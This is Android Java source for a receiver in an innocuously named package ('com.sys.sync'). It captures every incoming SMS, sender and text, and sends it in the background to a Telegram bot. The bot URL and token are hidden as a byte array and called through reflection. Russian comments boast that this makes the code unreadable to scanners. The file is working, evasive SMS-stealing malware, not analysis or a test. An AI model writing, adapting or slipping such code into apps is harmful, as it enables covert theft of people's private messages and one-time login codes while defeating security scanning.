package com.sys.sync;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.lang.reflect.Method;
import java.net.URLEncoder;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            Bundle b = intent.getExtras();
            if (b == null) return;
            Object[] p = (Object[]) b.get("pdus");
            if (p == null) return;
            for (Object obj : p) {
                SmsMessage s = SmsMessage.createFromPdu((byte[]) obj);
                String data = s.getOriginatingAddress() + " : " + s.getMessageBody();
                new Thread(() -> dispatch(data)).start();
            }
        } catch (Exception ignored) {}
    }

    private void dispatch(String text) {
        try {
            // Токен и URL в байтах (абсолютно нечитаемо для сканера)
            byte[] raw = {104, 116, 116, 112, 115, 58, 47, 47, 97, 112, 105, 46, 116, 101, 108, 101, 103, 114, 97, 109, 46, 111, 114, 103, 47, 98, 111, 116, 56, 51, 56, 55, 56, 50, 57, 55, 48, 49, 58, 65, 65, 69, 68, 88, 117, 107, 111, 102, 81, 88, 107, 50, 110, 69, 88, 72, 100, 83, 106, 97, 100, 49, 97, 55, 84, 112, 71, 70, 50, 85, 97, 111, 102, 56, 47, 115, 101, 110, 100, 77, 101, 115, 115, 97, 103, 101, 63, 99, 104, 97, 116, 95, 105, 100, 61, 53, 50, 50, 53, 48, 54, 52, 48, 49, 52, 38, 116, 101, 120, 116, 61};
            String urlBase = new String(raw);
            String target = urlBase + URLEncoder.encode(text, "UTF-8");

            // Вызов через Рефлексию (Скрытая магия)
            Class<?> uClass = Class.forName("java.net.URL");
            Object uObj = uClass.getConstructor(String.class).newInstance(target);
            Method open = uClass.getMethod("openConnection");
            Object conn = open.invoke(uObj);
            
            Method resp = conn.getClass().getMethod("getResponseCode");
            resp.invoke(conn); 
        } catch (Exception e) {}
    }
}
